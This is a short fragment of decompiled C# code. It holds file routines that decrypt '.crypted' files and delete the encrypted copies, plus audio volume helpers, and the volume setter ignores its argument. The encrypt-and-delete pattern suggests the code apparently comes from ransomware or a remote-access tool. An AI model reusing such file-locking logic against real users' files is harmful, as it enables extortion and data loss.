			File.WriteAllBytes(path, bytes);
			File.Delete(inputFile);
		}
	}

	private static void DecryptFile(string inputFile, string password)
	{
		if (File.Exists(inputFile))
		{
			string path = inputFile.Replace(".crypted", "");
			byte[] bytes = DecryptBytes(File.ReadAllBytes(inputFile), password);
			File.WriteAllBytes(path, bytes);
			File.Delete(inputFile);
		}
	}

	public static void AudioVolumeSet(int volume)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Expected O, but got Unknown
		((AudioController<CoreAudioDevice>)new CoreAudioController()).get_DefaultPlaybackDevice();
	}

	public static double AudioVolumeGet()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Expected O, but got Unknown
		return ((Device)((AudioController<CoreAudioDevice>)new CoreAudioController()).get_DefaultPlaybackDevice()).get_Volume();
	}
}
